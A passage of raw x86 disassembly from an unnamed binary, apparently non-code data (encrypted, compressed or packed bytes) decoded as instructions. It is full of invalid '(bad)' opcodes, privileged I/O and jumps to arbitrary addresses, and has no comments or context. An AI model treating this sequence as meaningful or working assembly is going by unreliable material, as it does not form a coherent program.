  413fc3:	sub    edx,esi
  413fc5:	mov    ch,BYTE PTR [eax]
  413fc7:	out    dx,eax
  413fc8:	cmc    
  413fc9:	out    dx,eax
  413fca:	sub    eax,0xea7705d7
  413fcf:	push   0xe2806cbf
  413fd4:	cmp    al,BYTE PTR [eax]
  413fd6:	mov    bh,0x8c
  413fd8:	sahf   
  413fd9:	jno    0x41400d
  413fdb:	leave  
  413fdc:	or     DWORD PTR fs:[edx+0x1f572401],ecx
  413fe3:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  413fe5:	outs   dx,DWORD PTR ds:[esi]
  413fe6:	fsub   QWORD PTR [edi]
  413fe8:	inc    esp
  413fe9:	xchg   ebp,eax
  413fea:	out    dx,eax
  413feb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fec:	scas   al,BYTE PTR es:[edi]
  413fed:	add    edx,DWORD PTR [edi+0x2e]
  413ff0:	add    al,0x84
  413ff2:	jno    0x413f8d
  413ff4:	rcl    DWORD PTR [eax],cl
  413ff6:	idiv   DWORD PTR [eax+ebp*2-0x453fc824]
  413ffd:	dec    esi
  413ffe:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  414000:	jp     0x414003
  414002:	popa   
  414003:	mov    ds:0x2436f333,al
  414008:	push   ss
  414009:	mov    dl,0x83
  41400b:	ret    
  41400c:	gs out dx,al
  41400e:	rcr    DWORD PTR [esi+ebp*8-0x535b22ae],cl
  414015:	mov    cl,0xaa
  414017:	sahf   
  414018:	retf   
  414019:	inc    ecx
  41401a:	mov    WORD PTR [ebp-0xb57fe7f],fs
  414020:	bnd call 0xecc83cc9
  414026:	push   eax
  414027:	jecxz  0x413fb9
  414029:	scas   al,BYTE PTR es:[edi]
  41402a:	xchg   ebx,eax
  41402b:	fmul   DWORD PTR es:[edi+eax*2-0x4ed5d2bd]
  414033:	pop    ecx
  414034:	push   esi
  414035:	dec    esp
  414036:	pusha  
  414037:	and    DWORD PTR [esi+0x291a834d],edi
  41403d:	jne    0x41403a
  41403f:	mov    al,0x31
  414041:	ins    DWORD PTR es:[edi],dx
  414042:	fwait
  414043:	popa   
  414044:	adc    al,0x41
  414046:	xchg   ebx,eax
  414047:	cmp    bl,dh
  414049:	cwde   
  41404a:	mov    ds:0x8c3be1d7,eax
  41404f:	sbb    al,BYTE PTR [edi]
  414051:	sbb    al,0xfb
  414053:	jmp    0x414030
  414055:	cli    
  414056:	push   esp
  414057:	ins    BYTE PTR es:[edi],dx
  414058:	mov    esi,0xbce162e6
  41405d:	jnp    0x414091
  41405f:	out    0xed,eax
  414061:	ja     0x414095
  414063:	lods   al,BYTE PTR ds:[esi]
  414064:	xor    dh,BYTE PTR [esi-0x342c0631]
  41406a:	pop    ecx
  41406b:	int    0xbc
  41406d:	jmp    0x4140cf
  41406f:	test   al,0xf8
  414071:	icebp  
  414072:	adc    BYTE PTR [ebx+0x6e82c540],bl
  414078:	ror    BYTE PTR [esi],0x73
  41407b:	call   0x9760:0xadd7e547
  414082:	add    edx,0x7c3719ba
  414088:	fs or  dl,0x4
  41408c:	mov    esi,0xd36cd1c
  414091:	outs   dx,DWORD PTR ds:[esi]
  414092:	repz gs (bad) 
  414096:	jmp    0x63f5:0x50a75005
  41409d:	jno    0x4140ad
  41409f:	das    
  4140a0:	sti    
  4140a1:	mov    esi,DWORD PTR [edx]
  4140a3:	aaa    
  4140a4:	xor    BYTE PTR [ecx],ch
  4140a6:	pop    es
  4140a7:	push   0x30
  4140a9:	jo     0x4140dc
  4140ab:	cmp    BYTE PTR [esp+ebx*1-0x1d3cabfa],ah
  4140b2:	int3   
  4140b3:	leave  
  4140b4:	inc    edi
  4140b5:	sbb    ecx,DWORD PTR [ecx+0x29a923cf]
  4140bb:	cmp    ebp,ebx
  4140bd:	sub    ah,BYTE PTR [eax]
  4140bf:	test   dh,ch
  4140c1:	mov    ds:0x3dbda90a,al
  4140c6:	pusha  
  4140c7:	(bad)  
  4140c8:	xlat   BYTE PTR ds:[ebx]
  4140c9:	mov    cl,BYTE PTR [ebx]
  4140cb:	push   cs
  4140cc:	outs   dx,DWORD PTR ds:[esi]
  4140cd:	sub    dh,BYTE PTR [esp+0x2c]
  4140d1:	dec    edx
  4140d2:	or     eax,0x43ca9daf
  4140d7:	jo     0x414081
  4140d9:	ins    DWORD PTR es:[edi],dx
  4140da:	add    al,0x52
  4140dc:	retf   
  4140dd:	push   edi
  4140de:	(bad)  
  4140df:	jmp    0x41415f
  4140e1:	int    0xef
  4140e3:	popa   
  4140e4:	retf   
  4140e5:	popf   
  4140e6:	pop    ecx
  4140e7:	add    esi,ebx
  4140e9:	adc    eax,0x79406205
  4140ee:	mov    WORD PTR [ebx+0x5c278e2e],es
  4140f4:	jl     0x4140a2
  4140f6:	and    al,0x5a
  4140f8:	jno    0x4140cc
  4140fa:	sti    
  4140fb:	js     0x414136
  4140fd:	sti    
  4140fe:	test   BYTE PTR [eax-0x75],dl
  414101:	dec    esi
  414102:	cmp    DWORD PTR [esi+0x234a92f3],edi
  414108:	inc    edi
  414109:	scas   eax,DWORD PTR es:[edi]
  41410a:	mov    WORD PTR [esi-0x5ac33ffb],?
  414110:	sub    ecx,DWORD PTR [ebx]
  414112:	mov    cl,0xef
  414114:	scas   al,BYTE PTR es:[edi]
  414115:	or     DWORD PTR [ebx],ebx
  414117:	popa   
  414118:	mov    ah,cl
  41411a:	(bad)  
  41411c:	mov    bl,0x87
  41411e:	fild   DWORD PTR [ebp-0x10]
  414121:	mov    esp,0x686de358
  414126:	cmp    al,0x9c
  414128:	cmp    ebx,edx
  41412a:	jp     0x41414f
  41412c:	inc    esp
  41412d:	fcmovne st,st(1)
  41412f:	ror    DWORD PTR [ecx-0x42],cl
  414132:	sbb    BYTE PTR [ebx+0x7564c97f],0x6e
  414139:	adc    dl,ch
  41413b:	out    0x7c,eax
  41413d:	sbb    bh,BYTE PTR [ebx]
  41413f:	out    dx,eax
  414140:	sbb    BYTE PTR ds:0x1743fd71,cl
  414146:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  414148:	xchg   cl,ah
  41414a:	jle    0x41413b
  41414c:	adc    DWORD PTR [eax-0x4e],0xffffff8e
  414150:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414151:	(bad)
  414154:	xchg   esi,eax
  414155:	mov    ds:0x56c15e2d,al
  41415a:	or     al,0x64
  41415c:	test   ah,dh
  41415e:	cli    
  41415f:	pop    es
  414160:	mov    ds:0x22d901fc,al
  414165:	rcl    BYTE PTR [esi-0x1ff7c4f0],0x84
  41416c:	pop    ss
  41416d:	dec    ecx
  41416e:	es int3 
  414170:	adc    DWORD PTR [ebp+0x40],edi
  414173:	push   es
  414174:	inc    edi
  414175:	pop    esp
  414176:	aaa    
  414177:	ss loopne 0x4141eb
  41417a:	jns    0x414199
  41417c:	push   edi
  41417d:	add    al,0xe5
  41417f:	les    ebp,FWORD PTR [esi+0x5de57367]
  414185:	out    dx,al
  414186:	or     ah,BYTE PTR [esi]
  414188:	push   ss
  414189:	shr    DWORD PTR [edi],0xf0
  41418c:	pop    esi
  41418d:	(bad)
  414191:	inc    eax
  414192:	or     esi,DWORD PTR [eax+0x35]
  414195:	and    BYTE PTR ds:0xfa420a9a,dh
  41419b:	push   esp
  41419c:	inc    esi
  41419d:	mov    ds:0xe278d02c,al
  4141a2:	push   edx
  4141a3:	lods   eax,DWORD PTR ds:[esi]
  4141a4:	pop    ss
  4141a5:	sbb    BYTE PTR [edx+eax*8+0x10a22cf8],bh
  4141ac:	aam    0x62
  4141ae:	adc    ch,BYTE PTR [esi+0xfea06b3]
  4141b4:	bound  esp,QWORD PTR [esi-0x74]
  4141b7:	cmc    
  4141b8:	push   esi
  4141b9:	das    
  4141ba:	mov    ebx,0xeafbfb43
  4141bf:	outs   dx,BYTE PTR ds:[esi]
  4141c0:	adc    eax,0xc72d40e4
  4141c5:	addr16 test edx,eax
  4141c8:	mov    al,0x79
  4141ca:	push   ebx
  4141cb:	in     eax,dx
  4141cc:	les    edi,FWORD PTR [edi]
  4141ce:	pusha  
  4141cf:	and    eax,0x528552cb
  4141d4:	jo     0x4141e7
  4141d6:	pop    esi
  4141d7:	sbb    BYTE PTR [ebp+0x105ba5d],bh
  4141dd:	add    bl,BYTE PTR [esi-0x39]
  4141e0:	popa   
  4141e1:	in     eax,dx
  4141e2:	shl    DWORD PTR ds:0xdc2a93a8,1
  4141e8:	dec    ebx
  4141e9:	inc    ebx
  4141ea:	sahf   
  4141eb:	pop    ss
  4141ec:	pop    ecx
  4141ed:	out    0xfa,eax
  4141ef:	mov    fs,esi
  4141f1:	xchg   edi,eax
  4141f2:	loopne 0x4141dd
  4141f4:	(bad)  
  4141f5:	sti    
  4141f6:	pusha  
  4141f7:	mul    DWORD PTR [edi-0x3a]
  4141fa:	xor    eax,0xe2a91b44
  4141ff:	push   edx
  414200:	sub    eax,0x6548dd79
  414205:	xor    DWORD PTR [esi-0x6d],0x36
  414209:	jle    0x4141b5
  41420b:	add    eax,0x95228a63
  414210:	sub    DWORD PTR [edx+eax*8],ebx
  414213:	pop    ebp
  414214:	popa   
  414215:	mov    bh,0x14
  414217:	retf   
  414218:	ret    
  414219:	xchg   edi,eax
  41421a:	les    edi,FWORD PTR [edx-0x6b9f2a35]
  414220:	jmp    0x5549:0x73c6c9d4
  414227:	(bad)  
  414228:	arpl   si,cx
  41422a:	sbb    eax,esp
  41422c:	in     eax,0x92
  41422e:	cld    
  41422f:	push   cs
  414230:	add    BYTE PTR [ecx-0x60217e68],bl
  414236:	mov    ecx,0xeabb9c5a
  41423b:	scas   al,BYTE PTR es:[edi]
  41423c:	ins    BYTE PTR es:[edi],dx
  41423d:	fdivr  DWORD PTR [edi+edx*8-0x53]
  414241:	sbb    al,0xf
  414243:	ds je  0x414261
  414246:	cmp    eax,0xc3e23da6
  41424b:	gs pushf 
  41424d:	daa    
  41424e:	iret   
  41424f:	fs dec ebp
  414251:	xchg   esp,eax
  414252:	dec    ebp
  414253:	sbb    eax,0x5a3a4c6e
  414258:	dec    ebx
  414259:	cmp    eax,0xe774f321
  41425e:	jnp    0x41421e
  414260:	mov    dl,0x24
  414262:	xchg   edi,eax
  414263:	xchg   ebp,eax
  414264:	sub    dl,BYTE PTR [ecx-0x47]
  414267:	inc    esp
  414268:	xlat   BYTE PTR ds:[ebx]
  414269:	imul   esp,DWORD PTR ds:0xbafdcbe6,0x55
  414270:	inc    DWORD PTR [edx-0x733073c1]
  414276:	adc    al,0x41
  414278:	int    0xd8
  41427a:	div    esi
  41427c:	xchg   BYTE PTR ds:0x316a34c3,ch
  414282:	adc    ah,ah
  414284:	jnp    0x4142b8
  414286:	in     al,dx
  414287:	sbb    ah,cl
  414289:	jl     0x4142ca
  41428b:	stc    
  41428c:	mov    ebx,0x90bd8399
  414291:	mov    cl,0x4b
  414293:	dec    ecx
  414294:	cmp    esp,0x1f
  414297:	push   ebp
  414298:	jae    0x414262
  41429a:	es mov edx,0x4be21d82
  4142a0:	mov    al,ds:0xb20bbb6d
  4142a5:	repnz mov WORD PTR ds:[edx],fs
  4142a9:	jb     0x4142a3
  4142ab:	cmp    DWORD PTR [ecx],0xffffffef
  4142ae:	fild   WORD PTR [esi]
  4142b0:	pusha  
  4142b1:	jnp    0x414293
  4142b3:	fs std 
  4142b5:	add    al,BYTE PTR [eax-0x768e5d3c]
  4142bb:	call   DWORD PTR [esi-0x51]
  4142be:	sbb    BYTE PTR [esp+edi*8+0x37],cl
  4142c2:	test   DWORD PTR [esi+0x728a4aa5],ebx
  4142c8:	call   0xb28a3884
  4142cd:	jge    0x41431a
  4142cf:	out    dx,eax
  4142d0:	test   edi,0x898a347d
  4142d6:	loope  0x4142a5
  4142d8:	adc    DWORD PTR [esi+0x7910a956],eax
  4142de:	fwait
  4142df:	les    ebp,FWORD PTR [edx-0x54]
  4142e2:	icebp  
  4142e3:	test   DWORD PTR [ecx],edx
  4142e5:	push   edi
  4142e6:	sbb    al,BYTE PTR [ebp+0x58b05baa]
  4142ec:	adc    edi,esp
  4142ee:	retf   
  4142ef:	js     0x414303
  4142f1:	out    0x96,al
  4142f3:	mov    eax,ds:0x91568bb2
  4142f8:	iret   
  4142f9:	shr    DWORD PTR [esi+0x2f2bca4],0x17
  414300:	fmul   QWORD PTR [eax]
  414302:	push   ds
  414303:	add    BYTE PTR [esi],cl
  414305:	les    ebp,FWORD PTR [ebx+0x3712fd1e]
  41430b:	and    BYTE PTR [edx-0x4a],ch
  41430e:	leave  
  41430f:	pop    edi
  414310:	dec    edi
  414311:	mov    fs,WORD PTR [esi]
  414313:	dec    eax
  414314:	mov    dl,0x7a
  414316:	xchg   esp,eax
  414317:	fist   WORD PTR [eax-0x235ec63c]
  41431d:	pop    es
  41431e:	or     dl,BYTE PTR [edx]
  414320:	adc    ah,BYTE PTR [ecx+0x57aa0d3c]
  414326:	(bad)  
  414327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414328:	or     ah,BYTE PTR [ebx]
  41432a:	inc    edi
  41432b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41432c:	pushf  
  41432d:	mov    bh,0x51
  41432f:	into   
  414330:	mov    bh,0x94
  414332:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414333:	pop    es
  414334:	pop    esp
  414335:	adc    esi,ebx
  414337:	pushf  
  414338:	and    DWORD PTR [ecx],eax
  41433a:	test   BYTE PTR [esi-0x34f9e2cf],ch
  414340:	push   0x6d
  414342:	mov    dh,0x27
  414344:	ficom  WORD PTR [esi]
  414346:	sub    bh,BYTE PTR [edi+0x0]
  414349:	sbb    al,0xd4
  41434b:	and    DWORD PTR [edi+edx*1-0x65],edi
  41434f:	std    
  414350:	sbb    BYTE PTR [ebp-0x65],cl
  414353:	pop    esp
  414354:	inc    BYTE PTR [ebx+0x3cfba5dd]
  41435a:	jne    0x41433d
  41435c:	ret    
  41435d:	cmp    ch,BYTE PTR [ecx-0x78]
  414360:	pop    ecx
  414361:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414362:	xor    ah,BYTE PTR [edi+eiz*4+0x10]
  414366:	cmp    al,0xb8
  414368:	jmp    0x414324
  41436a:	add    edx,edx
  41436c:	stos   BYTE PTR es:[edi],al
  41436d:	div    DWORD PTR [ecx+0x5ee77a96]
  414373:	and    DWORD PTR [ebp+0x1e],edx
  414376:	mov    ch,0xff
  414378:	call   0x46e2:0x333920a8
  41437f:	(bad)  
  414380:	sti    
  414381:	xchg   ecx,eax
  414382:	push   0x1c
  414384:	mov    eax,DWORD PTR [edx+0xa]
  414387:	and    BYTE PTR [esi-0x14],0x7d
  41438b:	xchg   esi,eax
  41438c:	jmp    0x95084445
  414391:	dec    edi
  414392:	mov    ebx,0x3f529424
  414397:	lods   al,BYTE PTR ds:[esi]
  414398:	cli    
  414399:	mov    ebp,0x4f9cf966
  41439e:	push   0x6241ad0b
  4143a3:	mov    BYTE PTR [eax+0x71b52ab2],ah
  4143a9:	pop    eax
  4143aa:	dec    ecx
  4143ab:	mov    ds:0xbecc5afe,eax
  4143b0:	push   edi
  4143b1:	xchg   edx,eax
  4143b2:	jb     0x41437a
  4143b4:	pop    ss
  4143b5:	loopne 0x41441f
  4143b7:	add    ebp,DWORD PTR [edi+eax*1]
  4143ba:	sahf   
  4143bb:	lods   eax,DWORD PTR ds:[esi]
  4143bc:	fmulp  st(4),st
  4143be:	cs das 
  4143c0:	call   0x9cf51e32
  4143c5:	and    BYTE PTR [eax-0x692c81e0],cl
  4143cb:	test   al,0xd5
  4143cd:	cmp    dh,BYTE PTR [ebp+0x70effb8c]
  4143d3:	imul   ebx,DWORD PTR [ebx+0x6f7e3bc2],0xbb1ac7b9
  4143dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143de:	sub    cl,BYTE PTR [edx-0x63413eea]
  4143e4:	dec    edx
  4143e5:	push   esi
  4143e6:	outs   dx,DWORD PTR ds:[esi]
  4143e7:	inc    ecx
  4143e8:	sbb    bh,dl
  4143ea:	pop    edi
  4143eb:	jo     0x41441d
  4143ed:	inc    esp
  4143ee:	jbe    0x41446b
  4143f0:	mov    ch,0x9
  4143f2:	pop    ss
  4143f3:	imul   esp,DWORD PTR [esi-0x16],0xcbb62ae8
  4143fa:	test   DWORD PTR [ecx-0x57d14eeb],esp
  414400:	xchg   edx,eax
  414401:	cld    
  414402:	xor    BYTE PTR [eax-0x17e951e1],0xf4
  414409:	ror    bh,1
  41440b:	mov    WORD PTR [edx],cs
  41440d:	nop
  41440e:	lds    eax,FWORD PTR [esi+0x6c]
  414411:	in     eax,0xf9
  414413:	adc    eax,0x8584e3b9
  414418:	cmp    DWORD PTR [edi],edx
  41441a:	and    ebx,ecx
  41441c:	in     al,0xd3
  41441e:	int    0xfb
  414420:	adc    dh,BYTE PTR [edx]
  414422:	out    0x5,al
  414424:	lods   al,BYTE PTR ds:[esi]
  414425:	mov    ds:0x7f822d2,al
  41442a:	je     0x4143c7
  41442c:	gs dec edx
  41442e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41442f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414430:	les    edi,FWORD PTR [ecx+esi*8+0x18]
  414434:	inc    ecx
  414435:	inc    esp
  414436:	shl    BYTE PTR [edi],cl
  414438:	inc    edi
  414439:	std    
  41443a:	xchg   DWORD PTR [edi],edi
  41443c:	popa   
  41443d:	adc    eax,esp
  41443f:	test   DWORD PTR [ebx+eax*2-0x3a],edi
  414443:	fcmovnu st,st(3)
  414445:	ret    0xa90a
  414448:	push   ebp
  414449:	fiadd  DWORD PTR [edi+0x4f43036b]
  41444f:	xchg   BYTE PTR [edx],ch
  414451:	xchg   ecx,eax
  414452:	inc    ecx
  414453:	add    dl,BYTE PTR [ecx+edi*2-0x7b]
  414457:	and    eax,0x4ca8a733
  41445c:	fistp  DWORD PTR [ebx]
  41445e:	fld    QWORD PTR [ecx-0x6e54d2dc]
  414464:	xor    DWORD PTR [ebx],esi
  414466:	fucomp st(3)
  414468:	xor    esp,esp
  41446a:	sbb    ebx,eax
  41446c:	push   ss
  41446d:	je     0x414439
  41446f:	dec    esi
  414470:	mov    eax,0x3c35f37a
  414475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414476:	mov    bl,0x57
  414478:	inc    ebp
  414479:	enter  0x688a,0x2b
  41447d:	fcomip st,st(3)
  41447f:	add    al,0xd7
  414481:	sbb    dh,BYTE PTR [ebx]
  414483:	mov    al,ds:0xb2bb9947
  414488:	stos   DWORD PTR es:[edi],eax
  414489:	push   ecx
  41448a:	xor    BYTE PTR [ecx],dh
  41448c:	cmp    DWORD PTR [ecx-0x6a],0x255d630c
  414493:	cmp    eax,0xe50a801a
  414498:	jne    0x4144a0
  41449a:	pop    esi
  41449b:	(bad)  
  41449c:	xchg   edx,eax
  41449d:	aam    0x3c
  41449f:	or     edx,esi
  4144a1:	push   ecx
  4144a2:	shl    bh,0x69
  4144a5:	rol    BYTE PTR [eax],1
  4144a7:	mov    ?,WORD PTR [edi-0x20]
  4144aa:	pop    es
  4144ab:	pop    esi
  4144ac:	aas    
  4144ad:	repz out 0x1c,eax
  4144b0:	rcl    DWORD PTR [edx-0x20],cl
  4144b3:	pushf  
  4144b4:	add    bh,BYTE PTR [esi]
  4144b6:	out    0x95,al
  4144b8:	or     al,BYTE PTR [eax]
  4144ba:	mov    bl,0x2d
  4144bc:	inc    edi
  4144bd:	mov    ch,0xa
  4144bf:	out    0xb6,al
  4144c1:	rol    ch,0xb8
  4144c4:	cmp    cl,bh
  4144c6:	and    dl,BYTE PTR [esi+0x77df9dc3]
  4144cc:	dec    esi
  4144cd:	fstp   st(7)
  4144cf:	mov    eax,0x3df32481
  4144d4:	scas   al,BYTE PTR es:[edi]
  4144d5:	addr16 out 0xaf,eax
  4144d8:	(bad)  
  4144d9:	mov    ds:0x39f9af4c,eax
  4144de:	inc    esp
  4144df:	cmp    esp,ebp
  4144e1:	fcmovne st,st(7)
  4144e3:	pop    edi
  4144e4:	aaa    
  4144e5:	xor    eax,0xe427e644
  4144ea:	test   eax,0x10dca70
  4144ef:	jbe    0x4144bb
  4144f1:	icebp  
  4144f2:	pop    es
  4144f3:	out    dx,al
  4144f4:	push   0x66
  4144f6:	test   al,0xf1
  4144f8:	cmp    BYTE PTR [edi],0x31
  4144fb:	mov    cl,0x79
  4144fd:	xchg   ecx,eax
  4144fe:	mov    cl,0x9
  414500:	shl    DWORD PTR [eax],cl
  414502:	pop    ss
  414503:	test   al,0x86
  414505:	arpl   si,di
  414507:	cld    
  414508:	icebp  
  414509:	ins    DWORD PTR es:[edi],dx
  41450a:	mov    cl,0x1f
  41450c:	pop    edi
  41450d:	ins    BYTE PTR es:[edi],dx
  41450e:	dec    edi
  41450f:	inc    ebp
  414510:	iret   
  414511:	(bad)  
  414512:	pop    ebx
  414513:	in     eax,0xa9
  414515:	inc    ecx
  414516:	loop   0x414503
  414518:	ret    
  414519:	jae    0x414552
  41451b:	loopne 0x4144b9
  41451d:	dec    DWORD PTR [eax]
  41451f:	mov    al,ds:0xc64241cb
  414524:	int3   
  414525:	push   ss
  414526:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414527:	inc    esp
  414528:	add    DWORD PTR [ecx+0x4e],esi
  41452b:	loope  0x4144ca
  41452d:	or     ch,BYTE PTR [edx]
  41452f:	mov    dl,0xeb
  414531:	ror    BYTE PTR [esi+ecx*1],0xaa
  414535:	push   ss
  414536:	jmp    0x65ca:0x33807889
  41453d:	pop    ss
  41453e:	push   edi
  41453f:	sub    al,0x94
  414541:	aaa    
  414542:	pop    ds
  414543:	mov    eax,0x456348f0
  414548:	fst    DWORD PTR [ebx+0x11]
  41454b:	jmp    0x730928b1
  414550:	out    0x39,eax
  414552:	xchg   ebx,eax
  414553:	mov    ecx,0xe4f91fc7
  414558:	repnz ss out dx,eax
  41455b:	cwde   
  41455c:	cmp    eax,0xaabf3611
  414561:	lds    ebx,FWORD PTR [ebp-0x5d]
  414564:	cmp    ecx,DWORD PTR [edi+0x5130f5eb]
  41456a:	nop
  41456b:	clc    
  41456c:	jb     0x4145d7
  41456e:	mov    ds:0x5ad1c7a7,al
  414573:	test   DWORD PTR [esi],esi
  414575:	daa    
  414576:	retf   
  414577:	sbb    DWORD PTR [eax-0x1d21995b],esi
  41457d:	loop   0x4145bd
  41457f:	sub    dh,BYTE PTR ds:0xb5d432cd
  414585:	inc    eax
  414586:	out    dx,eax
  414587:	push   0xfffffffb
  414589:	mov    dh,0x87
  41458b:	adc    eax,0x86d44b27
  414590:	add    eax,0x5b8c74f8
  414595:	cdq    
  414596:	mov    al,ds:0x612183dd
  41459b:	imul   BYTE PTR [eax+0x2595fd53]
  4145a1:	cmp    ebx,edi
  4145a3:	jmp    0x41459d
  4145a5:	pop    ds
  4145a6:	xor    DWORD PTR [edi-0x47b66b66],0x9
  4145ad:	xor    bh,BYTE PTR [edx]
  4145af:	adc    eax,0xbb35e10c
  4145b4:	xchg   edx,eax
  4145b5:	xor    bl,BYTE PTR [edx+0x1e]
  4145b8:	in     eax,dx
  4145b9:	push   cs
  4145ba:	and    BYTE PTR [edi+eiz*8-0x72],ah
  4145be:	mov    dh,0x7e
  4145c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145c1:	(bad)  
  4145c2:	mov    DWORD PTR [edx+0xcc6e106],ebp
  4145c8:	out    0x84,al
  4145ca:	push   0x32b649f2
  4145cf:	icebp  
  4145d0:	stos   BYTE PTR es:[edi],al
  4145d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145d2:	xor    ebx,edi
  4145d4:	stos   DWORD PTR es:[edi],eax
  4145d5:	jns    0x414560
  4145d7:	cmp    esi,DWORD PTR [ecx+0x3e]
  4145da:	cmp    esi,DWORD PTR [esi]
  4145dc:	pop    ebx
  4145dd:	in     eax,0x48
  4145df:	push   ebp
  4145e0:	out    dx,al
  4145e1:	xchg   edi,eax
  4145e2:	das    
  4145e3:	pop    edi
  4145e4:	test   BYTE PTR [edx+0x6b0a4acb],0x0
  4145eb:	pop    ss
  4145ec:	out    0x82,eax
  4145ee:	and    bh,BYTE PTR ds:0xe30af20a
  4145f4:	xor    eax,0xf2bfe753
  4145f9:	pushf  
  4145fa:	adc    DWORD PTR [esi+0x55],0xe8d96df8
  414601:	inc    edx
  414602:	je     0x414584
  414604:	mov    ebx,0xf56cf680
  414609:	lea    esi,[ebx]
  41460b:	xor    eax,0xdb8b9dd5
  414610:	int    0x97
  414612:	dec    ecx
  414613:	xchg   ebp,eax
  414614:	mov    ds:0xabf82675,eax
  414619:	cmp    cl,bl
  41461b:	sbb    ebx,DWORD PTR [ecx+0x3]
  41461e:	xor    al,0xee
  414620:	inc    esi
  414621:	sbb    eax,0xdcbe3a85
  414626:	mov    al,0x38
  414628:	test   al,0x7f
  41462a:	mov    dh,0xbc
  41462c:	sbb    DWORD PTR [ecx],edx
  41462e:	stos   BYTE PTR es:[edi],al
  41462f:	sub    ch,ch
  414631:	or     ebx,0x249fd650
  414637:	pushf  
  414638:	pop    esi
  414639:	mov    ch,BYTE PTR [ebx-0x5f]
  41463c:	clc    
  41463d:	shl    BYTE PTR [esi],cl
  41463f:	inc    esi
  414640:	jl     0x4146ab
  414642:	sbb    edi,DWORD PTR [edx+ebp*4+0x327dde0f]
  414649:	lods   eax,DWORD PTR ds:[esi]
  41464a:	push   ecx
  41464b:	jp     0x414615
  41464d:	sbb    ebx,eax
  41464f:	retf   0xf180
  414652:	es enter 0x4d6c,0x2c
  414657:	pushf  
  414658:	jno    0x41463b
  41465a:	inc    edx
  41465b:	lahf   
  41465c:	dec    eax
  41465d:	icebp  
  41465e:	mov    ebx,0x3e127b
  414663:	clc    
  414664:	add    cl,dh
  414666:	out    dx,eax
  414667:	es pop ecx
  414669:	mov    cs,WORD PTR [ebx+0x21cf94b7]
  41466f:	mov    eax,fs
  414671:	mov    ds:0xebb2a220,al
  414676:	ss mov dh,0xb2
  414679:	add    eax,0x4cad0130
  41467e:	xchg   ebx,eax
  41467f:	iret   
  414680:	push   edi
  414681:	imul   DWORD PTR ds:0xd6a3268f
  414687:	push   ebp
  414688:	mov    al,0x25
  41468a:	addr16 xchg sp,ax
  41468d:	inc    DWORD PTR [ecx]
  41468f:	xor    al,0xe
  414691:	lods   eax,DWORD PTR ds:[esi]
  414692:	cmp    bl,BYTE PTR [ebx]
  414694:	xor    dh,BYTE PTR [ebx]
  414696:	xchg   esi,eax
  414697:	pop    esp
  414698:	dec    edx
  414699:	int3   
  41469a:	xchg   esp,eax
  41469b:	xor    eax,0x4b0ea6b5
  4146a0:	mov    al,0xcd
  4146a2:	int3   
  4146a3:	cmp    al,0xb9
  4146a5:	ja     0x41468c
  4146a7:	lods   eax,DWORD PTR ds:[esi]
  4146a8:	mov    al,0xdf
  4146aa:	es das 
  4146ac:	in     eax,dx
  4146ad:	out    0xf0,eax
  4146af:	jge    0x4146a6
  4146b1:	pop    ebp
  4146b2:	inc    edi
  4146b3:	fdivr  QWORD PTR [ebx]
  4146b5:	loopne 0x41471e
  4146b7:	js     0x4146bb
  4146b9:	sub    esp,DWORD PTR [edi]
  4146bb:	or     eax,ecx
  4146bd:	add    al,0x42
  4146bf:	pop    ebx
  4146c0:	inc    edx
  4146c1:	out    dx,eax
  4146c2:	dec    ebx
  4146c3:	dec    ebx
  4146c4:	fwait
  4146c5:	aad    0x86
  4146c7:	idiv   BYTE PTR ds:0xd4ed40a3
  4146cd:	sti    
  4146ce:	sub    al,0x42
  4146d0:	imul   ecx,DWORD PTR [edi],0xcbd14be8
  4146d6:	scas   eax,DWORD PTR es:[edi]
  4146d7:	xor    ah,BYTE PTR [ebx-0xd11025f]
  4146dd:	pop    DWORD PTR [ebx+0x2]
  4146e0:	add    edi,0x5e
  4146e3:	mov    ds:0x39d6f55c,al
  4146e8:	mov    edx,0xb21ee651
  4146ed:	sbb    DWORD PTR [ecx-0x14],eax
  4146f0:	mov    ch,0xb6
  4146f2:	jmp    0xcad0:0x3c73d563
  4146f9:	cdq    
  4146fa:	sbb    BYTE PTR [ebx+ebx*8-0x4d473f77],al
  414701:	pop    edi
  414702:	test   eax,0xf06325f5
  414707:	sub    dh,bh
  414709:	cmp    al,0x72
  41470b:	add    eax,0x8182fcb7
  414710:	rol    BYTE PTR [edi+0x50],0x8f
  414714:	and    DWORD PTR [eax],ebp
  414716:	or     al,BYTE PTR [eax+eiz*4-0x5519dcc2]
  41471d:	pop    ss
  41471e:	mov    edi,ebp
  414720:	mov    esp,0x5f3e1880
  414725:	ret    
  414726:	icebp  
  414727:	icebp  
  414728:	test   BYTE PTR [esi+ebp*2+0xd],0xf4
  41472d:	jbe    0x414725
  41472f:	mov    dl,0x79
  414731:	pop    es
  414732:	outs   dx,DWORD PTR ds:[esi]
  414733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414734:	dec    ecx
  414735:	jp     0x4146db
  414737:	jmp    0xa1c6:0x1ea1e9af
  41473e:	bound  eax,QWORD PTR [esi-0x65967165]
  414744:	add    BYTE PTR [ecx-0x6c],dl
  414747:	jb     0x4146fa
  414749:	enter  0x78c2,0xc3
  41474d:	inc    ebp
  41474e:	jb     0x4146f2
  414750:	mov    edx,0x7265db49
  414755:	cmp    DWORD PTR [esi],0x7d
  414758:	push   0x1fb1765f
  41475d:	mov    bh,0x6b
  41475f:	cmp    ch,BYTE PTR [ecx+0x6f1920c4]
  414765:	push   0x3aa48c32
  41476a:	dec    DWORD PTR [ebx-0x651580ae]
  414770:	xor    eax,0x7b03cad4
